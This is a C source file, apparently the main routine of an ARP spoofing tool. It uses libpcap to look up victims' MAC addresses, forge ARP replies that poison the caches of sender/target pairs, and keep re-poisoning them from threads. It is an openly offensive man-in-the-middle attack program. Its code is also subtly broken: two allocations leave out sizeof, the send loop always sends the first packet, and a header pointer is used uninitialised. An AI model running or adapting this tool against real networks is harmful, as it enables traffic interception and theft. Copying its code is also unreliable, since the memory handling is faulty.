#include <stdio.h>
#include <stdint.h>
#include <pcap.h>
#include <stdlib.h>
#include <pthread.h>
#include "parse.h"
#include "function.h"

const u_char *rep;

int main(int argc, char * argv[]){

    // if((argc < 3) && (argc % 2 != 0)){
    //     usage();
    //     exit(1);
    // }

    // Create Session
    int session_num = (argc - 2) / 2;
    Session * session = (Session *)malloc(sizeof(Session) * session_num);
    int n = 0;

    for(int i = 0; i < session_num; i++){
        session[i].sender_ip = inet_addr(argv[2 + n]);
        session[i].target_ip = inet_addr(argv[3 + n]);
        n += 2;
    }

    char* dev = argv[1]; //network interface name
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    uint32_t attacker_ip;
    uint8_t attacker_mac[6];

    /* 1. Get Attacker's IP and MAC address */
    attacker_ip = getAttackerIP(argv[1]);
    getAttackerMAC(argv[1], attacker_mac);

    struct pcap_pkthdr* header;

    /* 2. Find sender's MAC and target's MAC using ARP request */
    find_MAC(handle, header, session_num, rep, attacker_mac, attacker_ip, session);

    /* 3. Make spoofing packet */
    unsigned char ** arp_spoofed_pkt = (unsigned char **)malloc(sizeof(unsigned char *)*session_num);
    Attack_arg * args = (Attack_arg *)malloc(session_num);

    for(int i = 0; i < session_num; i++){
        arp_spoofed_pkt[i] = (unsigned char *)malloc(sizeof(unsigned char) * 50);
        memset(arp_spoofed_pkt[i], 0, 50);
        ARP_Packet * arp_pkt = (ARP_Packet *)malloc(sizeof(ARP_Packet));
        make_arp_packet(session[i].sender_mac, attacker_mac, 2, session[i].target_ip, session[i].sender_ip, arp_pkt);
        memcpy(arp_spoofed_pkt[i], arp_pkt, sizeof(*arp_pkt));

        // for(int j = 0; j < sizeof(*arp_pkt); j++){
        //     printf("%02X ", arp_spoofed_pkt[i][j]);
        // }printf("\n");

        args[i].handle = handle;
        args[i].header = header;
        args[i].spoofed_pkt = arp_spoofed_pkt[i];
        memcpy(args[i].attacker_mac, attacker_mac, sizeof(attacker_mac));
        args[i].attacker_ip = attacker_ip;
        args[i].sess = &session[i];
    }
    for(int i = 0; i < session_num; i++){
        if(pcap_sendpacket(handle, args->spoofed_pkt, sizeof(unsigned char)*50)!=0){
            printf("error\n");
            exit(0);
        }printf("[+] Success to send 1st spoofed pkt %d\n", i+1);        
    }

    /* 4. Attack */
    pthread_t * p_thread = (pthread_t *)malloc(session_num);
    int thr_id;
    int status;
    
    for(int i = 0; i < session_num; i++){
        thr_id = pthread_create(&p_thread[i], NULL, arp_spoof, (void *)&args[i]);
        if (thr_id < 0){
            perror("thread create error : ");
            exit(0);
        }
    }

    for(int i = 0; i < session_num; i++){
        pthread_join(p_thread[i], (void **)&status);
    }

    return 0;

}
